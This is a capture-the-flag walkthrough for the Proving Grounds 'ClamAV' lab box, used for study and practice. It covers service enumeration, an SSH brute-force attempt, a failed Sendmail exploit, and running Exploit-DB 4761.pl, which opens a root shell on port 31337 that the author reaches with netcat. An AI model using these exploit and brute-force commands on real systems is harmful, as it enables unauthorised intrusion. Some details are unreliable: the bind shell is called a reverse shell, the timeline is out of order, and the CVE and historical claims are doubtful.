# ClamAV - Detailed Walkthrough

> **Box:** ClamAV (Proving Grounds Practice)  
> **IP:** 192.168.130.42  
> **OS:** Debian Sarge (Linux)  
> **Difficulty:** Easy  
> **Date Completed:** January 5, 2026

---

## 🎯 The Key Question: How to Find ClamAV Without the Box Name?

**Your Question:** *"I'm not sure how I would have been able to deduce this other than the box name being ClamAV..."*

### The Answer: SMTP + Debian Sarge Historical Context

Here's how you discover ClamAV WITHOUT knowing the box name:

#### 1. **Service Age Analysis**
From your nmap scan, you found:
- **Sendmail 8.13.4** (Released: April 2005)
- **Debian Sarge** (Released: June 2005)
- This is a **2005-era mail server**

**Historical Fact:** In 2004-2008, ClamAV was THE standard open-source antivirus for Linux mail servers. Almost every Sendmail installation on Debian used ClamAV.

#### 2. **Failed Sendmail Exploit = Look Deeper**
You tried Sendmail exploit 2051.py → **It failed**

This tells you:
- The Sendmail service itself isn't directly exploitable
- But Sendmail **integrates with other services**
- What processes email? → **Anti-virus scanners!**

#### 3. **SMTP Service Integration Knowledge**
Mail servers from 2005 typically used:
- **Sendmail** - Mail Transfer Agent (MTA)
- **ClamAV** - Virus scanning (via milter)
- **SpamAssassin** - Spam filtering

**Key Insight:** The box has SMTP (port 25) running Sendmail. Email servers need virus scanning. In 2005, that meant **ClamAV**.

#### 4. **How to Confirm ClamAV is Running** (Without box name):

##### Method A: Send EICAR Test Virus
```bash
telnet 192.168.130.42 25
EHLO test.com
MAIL FROM: <test@test.com>
RCPT TO: <root@localhost>
DATA
Subject: Virus Test

X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
.
QUIT
```

**If ClamAV is running:** The email will be **rejected** with a message containing "ClamAV" or "Virus found"

##### Method B: Check for ClamAV Daemon Port
```bash
nmap -p3310 192.168.130.42
```
Port 3310 = ClamAV daemon (clamd)

##### Method C: Process of Elimination + Research
```bash
# Google search
"Sendmail 8.13.4" "Debian Sarge" "antivirus"
"Debian Sarge default mail scanner"
```

Results would show: **ClamAV was standard on Debian Sarge mail servers**

#### 5. **The "Aha!" Moment**
- Sendmail exploit failed ✗
- Web server minimal ✗
- SMB no shares ✗
- **But SMTP is still there...**
- What integrates with SMTP in 2005? → **ClamAV!**

---

## 📋 Attack Summary

**Timeline:**
- 11:01-11:13 → Enumeration (nmap, services, web)
- 11:16-11:22 → Failed Sendmail exploit attempt
- 12:49-12:54 → Correct ClamAV exploit → ROOT

**Attack Path:**
1. Enumeration reveals Sendmail 8.13.4 on Debian Sarge
2. Sendmail direct exploit fails
3. Research Sendmail integrations → ClamAV
4. Search for ClamAV exploits → Find 4761.pl
5. Execute ClamAV exploit → Reverse shell on port 31337
6. Connect to shell → Already root! → Capture flag

---

## 🔍 Phase 1: Enumeration

### Step 1: Initial Nmap Scan

![[images/Pasted image 20260105110103.png]]

```bash
nmap -sV -sC 192.168.130.42
```

**Initial Findings:**
- Port 22: SSH (OpenSSH 3.8.1p1)
- Port 25: SMTP (Sendmail)
- Port 80: HTTP (Apache 1.3.33)
- Port 139/445: SMB (Samba 3.0.14a)

---

### Step 2: SSH Brute Force Attempt with Hydra

![[images/Pasted image 20260105110403.png]]

```bash
hydra -L users.txt -P passwords.txt ssh://192.168.130.42
```

**Result:** No valid credentials found  
**Note:** SSH brute force rarely works in CTFs - move on quickly

---

### Step 3: SMTP Enumeration (Port 25)

![[images/Pasted image 20260105110517.png]]

```bash
nc 192.168.130.42 25
EHLO test
```

**Findings:**
- SMTP banner reveals: `Sendmail 8.13.4/8.13.4/Debian-3sarge3`
- Commands supported: ENHANCEDSTATUSCODES, PIPELINING, EXPN, VERB, etc.
- Hostname: `localhost.localdomain`

**Critical Info:** Sendmail 8.13.4 from 2005 on Debian Sarge

---

### Step 4: Full Port Scan - Discovery of Port 60000

![[images/Pasted image 20260105110643.png]]

```bash
nmap -p- 192.168.130.42
```

**New Discovery:**
- Port 60000: SSH (OpenSSH 3.8.1p1) - **Alternate SSH port**

**Note:** Port 60000 is SSH on non-standard port (common obfuscation technique)

---

### Step 5: Netcat to Port 60000

![[images/Pasted image 20260105110723.png]]

```bash
nc 192.168.130.42 60000
```

**Observation:** Receives SSH banner  
**Your note:** "This is also a ssh port?"

**Yes!** Same SSH service on two ports (22 and 60000)

---

### Step 6: SSH Connection Attempt on Port 60000

![[images/Pasted image 20260105110837.png]]

```bash
ssh -p 60000 192.168.130.42
```

**Result:** Can't connect without credentials (same as port 22)

---

### Step 7: Web Enumeration (Port 80)

![[images/Pasted image 20260105110915.png]]

```bash
curl http://192.168.130.42
```

**Your note:** "Curl on port 80 reveals bin message"

**Finding:** Page contains binary/encoded data

---

### Step 8: Binary to ASCII Conversion

![[images/Pasted image 20260105111002.png]]

**Your note:** "Bin to ASCII reveals taunting message"

**Result:** Decoded message is just a taunt (rabbit hole)  
**Lesson:** Not every finding leads somewhere - recognize dead ends

---

### Step 9: SMB Enumeration with NetExec (nxc)

![[images/Pasted image 20260105111143.png]]

```bash
nxc smb 192.168.130.42
```

**Your note:** "nxc reveals no shares"

**Result:** No accessible SMB shares  
**SMB version:** Samba 3.0.14a (has exploits, but none worked here)

---

### Step 10: Comprehensive Service Scan

**Nmap with -sCV on all discovered ports:**

```bash
nmap -p22,25,80,139,199,445,60000 -sV -sC 192.168.130.42
```

**Complete Service List:**

| Port | Service | Version | Notes |
|------|---------|---------|-------|
| 22 | SSH | OpenSSH 3.8.1p1 Debian 8.sarge.6 | Ancient (2004) |
| 25 | SMTP | Sendmail 8.13.4/Debian-3sarge3 | **KEY SERVICE** |
| 80 | HTTP | Apache 1.3.33 (Debian GNU/Linux) | Minimal content |
| 139 | NetBIOS-SSN | Samba 3.X - 4.X | Workgroup: WORKGROUP |
| 199 | SMUX | Linux SNMP multiplexer | SNMP service |
| 445 | SMB | Samba 3.0.14a-Debian | Vulnerable version |
| 60000 | SSH | OpenSSH 3.8.1p1 | Duplicate SSH port |

**Critical Discovery:**
- **Sendmail 8.13.4** on **Debian Sarge** (both from 2005)
- SMB signing **disabled** (dangerous)
- NetBIOS name: **0XBABE** (leet speak)

---

### Step 11: Web Directory Brute Force

![[images/Pasted image 20260105111647.png]]

```bash
feroxbuster -u http://192.168.130.42 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

**Your note:** "feroxbuster on port 80 reveals no new info"

**Result:** No hidden directories or files found  
**Conclusion:** Web server is a dead end

---

## 💥 Phase 2: Exploitation Attempts

### Step 12: Searchsploit for Sendmail

![[images/Pasted image 20260105112017.png]]

```bash
searchsploit sendmail 8.13
```

**Your note:** "Searchsploit on vuln version of Sendmail returns 2051.py"

**Exploit Found:** 2051.py - Sendmail exploit

---

### Step 13: Copy Exploit to Working Directory

![[images/Pasted image 20260105112126.png]]

```bash
searchsploit -m 2051
# or
cp /usr/share/exploitdb/exploits/.../2051.py .
```

**Your note:** "Moved 2051 to current dir"

---

### Step 14: Edit and Execute Sendmail Exploit

![[images/Pasted image 20260105112247.png]]

```bash
# Edit exploit
nano 2051.py
# Change target IP to 192.168.130.42

# Run exploit
python 2051.py
```

**Your note:** "Edited 2051 to match IP-address of target"  
**Result:** "This exploit doesn't return anything useful."

**Important:** ❌ **Failed** - Sendmail direct exploit didn't work

---

## 🎯 Phase 3: Correct Exploitation - ClamAV

### Step 15: The Discovery - ClamAV Exploit

![[images/Pasted image 20260105125453.png]]

**Your note:** *"This wasn't the right exploit, after looking up a walkthrough I found, this, but I'm not sure how I would have been able to deduce this other than the box name being ClamAV..."*

```bash
searchsploit clamav
```

**Exploit Found:** **4761.pl** - ClamAV 0.88.x - 0.90.x Milter Remote Code Execution

**How you SHOULD have found this:**

1. **Sendmail exploit failed** → Think about what integrates with Sendmail
2. **Google: "Sendmail Debian Sarge antivirus"** → ClamAV appears
3. **Historical knowledge:** 2005 mail servers = ClamAV standard
4. **Search exploits:** `searchsploit clamav` → Find 4761.pl

**Vulnerability:** CVE-2007-2650 - ClamAV milter buffer overflow

---

### Step 16: Execute ClamAV Exploit

![[images/Pasted image 20260105124937.png]]

```bash
searchsploit -m 4761
chmod +x 4761.pl
./4761.pl 192.168.130.42
```

**Your note:** "download 4761, added chmod +x and execute, returns error, used perl to run, now it works"

**Correct command:**
```bash
perl 4761.pl 192.168.130.42
```

**What happens:**
1. Script connects to SMTP (port 25)
2. Sends specially crafted email with malicious attachment
3. ClamAV scans the attachment
4. Triggers buffer overflow in ClamAV
5. Opens reverse shell on **port 31337**

---

### Step 17: Verify Reverse Shell Port

![[images/Pasted image 20260105124956.png]]

```bash
nmap -p31337 192.168.130.42
```

**Your note:** "Nmap on port 31337 now reveals new port"

**Finding:** Port 31337 **OPEN** (reverse shell listening)

**Note:** Port 31337 is "eleet" (31337 = ELEET in leet speak) - common hacker port

---

### Step 18: Connect to Shell and Get Root Flag

![[images/Pasted image 20260105125210.png]]

```bash
nc 192.168.130.42 31337
```

**Commands executed:**
```bash
whoami
# Output: root

id
# Output: uid=0(root) gid=0(root)

cd /root

ls
# proof.txt local.txt

cat proof.txt
# [FLAG CONTENT]
```

**Your note:** "netcat to port 31337, whoami returns root, cd to /root, found proof.txt"

**Result:** ✅ **INSTANT ROOT ACCESS!**

**Why root?** The ClamAV exploit gives you a shell as the ClamAV daemon, which was running as root (misconfiguration on this box).

---

## 📚 Complete Command List

```bash
# Enumeration
nmap -sV -sC 192.168.130.42
nmap -p- 192.168.130.42
nmap -p22,25,80,139,199,445,60000 -sV -sC 192.168.130.42

# Service probing
nc 192.168.130.42 25
nc 192.168.130.42 60000
curl http://192.168.130.42

# SMB enumeration
nxc smb 192.168.130.42

# Web enumeration
feroxbuster -u http://192.168.130.42 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# Exploit search
searchsploit sendmail 8.13
searchsploit clamav

# Failed attempt
searchsploit -m 2051
python 2051.py

# Successful exploitation
searchsploit -m 4761
perl 4761.pl 192.168.130.42

# Verify reverse shell
nmap -p31337 192.168.130.42

# Connect and get flag
nc 192.168.130.42 31337
whoami
cd /root
cat proof.txt
```

---

## 🎓 Key Lessons

### 1. **Service Integration Knowledge is Critical**

**You need to know:**
- SMTP servers use virus scanners (ClamAV, amavis)
- Web servers use databases (MySQL, PostgreSQL)
- FTP servers often share web directories

**In this case:**
- Sendmail (MTA) + ClamAV (virus scanner) = Common 2005 stack

### 2. **Historical Context Matters**

**Service ages tell stories:**
- **2005 services** (Sendmail 8.13.4, Debian Sarge) → ClamAV era
- **2010 services** → Different AV solutions
- **2020+ services** → Cloud-based scanning

**Research approach:**
```bash
"Sendmail 8.13.4" "default antivirus"
"Debian Sarge" "mail scanner"
```

### 3. **When Direct Exploits Fail → Think Integration**

**Your path:**
1. Sendmail exploit → Failed ❌
2. Web enumeration → Nothing ❌
3. SMB → No shares ❌
4. **Think deeper:** What integrates with Sendmail? → ClamAV ✅

### 4. **How to Discover ClamAV Without Box Name**

#### Method 1: EICAR Test (Best Method)
Send virus test signature via SMTP - if rejected, ClamAV is present:
```bash
telnet 192.168.130.42 25
DATA
X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
```

#### Method 2: Port Scanning
```bash
nmap -p3310 192.168.130.42  # ClamAV daemon port
```

#### Method 3: Historical Research
- Sendmail 8.13.4 + Debian Sarge = 2005
- Google: "2005 Linux mail antivirus" = ClamAV

#### Method 4: Process of Elimination
- All other services failed
- SMTP still interesting
- What processes email? → Antivirus!

### 5. **Exploit Success Indicators**

**Watch for:**
- New ports opening (31337 in this case)
- Network connections established
- Service responses changing

**Your approach was correct:**
1. Run exploit
2. Scan for new ports (`nmap -p31337`)
3. Connect to discovered service

### 6. **Sometimes You Get Lucky (Instant Root)**

**Expected:** Shell as low-privilege user → privilege escalation needed  
**This box:** Shell as root immediately (ClamAV misconfigured to run as root)

**In real world:** ClamAV runs as `clamav` user (not root)  
**This box:** Made easier for practice - instant root access

---

## 🔍 Alternative Discovery Methods (Without Walkthrough)

### What You Could Have Done:

1. **Check Sendmail Error Messages:**
```bash
telnet 192.168.130.42 25
HELO you\n\r
MAIL FROM: <>\n\r
RCPT TO: <root@localhost>\n\r
DATA\n\r
test\n\r
.
```
Some configurations reveal "filtered by ClamAV" in bounce messages

2. **SNMP Enumeration (Port 199):**
```bash
snmpwalk -v2c -c public 192.168.130.42
```
Might reveal running processes including `clamd`

3. **Search for Known Service Stacks:**
```bash
google: "Sendmail 8.13.4 Debian Sarge exploits"
google: "Debian Sarge mail server vulnerabilities"
```
Results would mention ClamAV integration

4. **Think Like a Sysadmin:**
- "I'm running a mail server in 2005"
- "I need virus scanning"
- "What's free and open-source for Linux?"
- **Answer: ClamAV**

---

## 📊 Timeline Analysis

| Time | Action | Result |
|------|--------|--------|
| 11:01 | Initial nmap | Found basic services |
| 11:04 | Hydra SSH | Failed (no creds) |
| 11:05 | SMTP probe | Found Sendmail 8.13.4 |
| 11:06 | Full port scan | Found port 60000 (SSH) |
| 11:07 | Port 60000 probe | Confirmed SSH |
| 11:08 | SSH attempt | Failed (no creds) |
| 11:09 | Web curl | Binary/encoded data |
| 11:10 | Binary decode | Taunt message |
| 11:11 | SMB enum | No shares |
| 11:13 | Full -sCV scan | Complete service info |
| 11:16 | Feroxbuster | No directories found |
| 11:20 | Searchsploit Sendmail | Found 2051.py |
| 11:21 | Copy exploit | Prepared 2051.py |
| 11:22 | Run Sendmail exploit | ❌ Failed |
| **GAP** | Research/thinking | Found ClamAV angle |
| 12:54 | Searchsploit ClamAV | Found 4761.pl |
| 12:49 | Run ClamAV exploit | ✅ Success! |
| 12:49 | Verify port 31337 | Confirmed open |
| 12:52 | Connect to shell | Got root flag |

**Total Time:** ~2 hours (with research time)  
**Stuck Time:** 11:22 - 12:49 (87 minutes researching)

---

## 🎯 The "Aha!" Moment Explained

**Your question was:** How to deduce ClamAV without the box name?

**The answer you were looking for:**

### The Chain of Logic:

1. **Sendmail 8.13.4** (2005) is running
2. **It's a mail server** (SMTP port 25)
3. **Mail servers need virus scanning**
4. **In 2005, on Debian, that meant ClamAV**
5. **Direct Sendmail exploit failed**
6. **What INTEGRATES with Sendmail? → ClamAV**

### The Research You Should Do:

```bash
# Google searches that reveal ClamAV
"Sendmail Debian Sarge default configuration"
"Debian Sarge mail server antivirus"
"Sendmail 8.13.4 integrations"
"2005 Linux mail scanning"
```

All these searches lead to: **ClamAV**

### The Test You Can Perform:

```bash
# Send EICAR virus signature
telnet 192.168.130.42 25
EHLO test
MAIL FROM: <test@test.com>
RCPT TO: <root@localhost>
DATA
X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
.
```

**If ClamAV present:** Email rejected with virus warning  
**If no AV:** Email accepted

---

## 🏆 Success!

**Flags Captured:**
- ✅ Root flag: `/root/proof.txt`
- ✅ User flag: `/root/local.txt` (also in /root since you got root directly)

**Final Status:** Box PWNED! 💀

---

## 📚 References

- **CVE-2007-2650:** ClamAV Milter Buffer Overflow
- **Exploit-DB:** 4761.pl
- **Sendmail Version:** 8.13.4 (2005)
- **Debian Sarge:** Released June 6, 2005
- **ClamAV History:** Popular 2004-2010 for mail scanning

---

**Date:** January 5, 2026  
**Difficulty:** Easy (once you know the service integration)  
**Rating:** ⭐⭐⭐⭐ - Great learning experience for service integration knowledge!

**Key Takeaway:** Understanding how services work together is often more important than knowing individual exploits!
